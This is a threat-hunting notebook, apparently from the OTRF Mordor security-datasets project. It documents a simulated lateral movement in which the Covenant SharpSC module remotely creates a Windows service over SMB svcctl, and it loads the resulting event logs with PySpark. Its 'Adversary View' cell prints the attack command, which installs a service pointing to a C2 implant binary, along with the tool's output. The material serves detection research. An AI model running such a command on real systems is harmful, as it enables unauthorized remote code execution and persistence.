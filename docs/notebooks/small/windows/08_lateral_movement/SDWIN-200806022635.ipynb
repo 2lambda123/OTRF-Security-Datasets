{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0e22e6ff",
   "metadata": {},
   "source": [
    "# Covenant SharpSC Create"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "89cfabf3",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a1af342",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/08/06 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | ['[TA0008](https://attack.mitre.org/tactics/TA0008)'] |\n",
    "| Techniques        | ['[T1021.002](https://attack.mitre.org/techniques/T1021/002)'] |\n",
    "| Tags              | ['RPC CreateService', 'SMB Svcctl'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8d3d57a1",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries remotely creating a service via RPC methods such as CreateService over SMB named pipes such as svcctl."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9be7171f",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0199d3a2",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/covenant_sharpsc_create_dcerpc_smb_svcctl.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/covenant_sharpsc_create_dcerpc_smb_svcctl.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/covenant_sharpsc_create_dcerpc_smb_svcctl.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/covenant_sharpsc_create_dcerpc_smb_svcctl.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4d223ee6",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eab6b667",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "088d6bd7",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "af7769eb",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [SharpSC](https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/SharpSC.yaml) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c0e25e98",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(wardog) > SharpSC /command:\"action=create computername=WORKSTATION6 service=Cyb3rWard0g displayname=OTR binpath=C:\\Windows\\System32\\GruntHTTP2.exe\"\n",
    "\n",
    "[-] Error uninstalling Cyb3rWard0g on WORKSTATION6. Reason: ServiceHandle is invalid.\n",
    "\n",
    "[*] Attempting to create service Cyb3rWard0g on WORKSTATION6...\n",
    "\n",
    "[*] Created Cyb3rWard0g Service on WORKSTATION6\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a75a560d",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d6379b19",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b2cb518d",
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fc40069f",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8469899",
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/covenant_sharpsc_create_dcerpc_smb_svcctl.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6853662d",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86ce028a",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
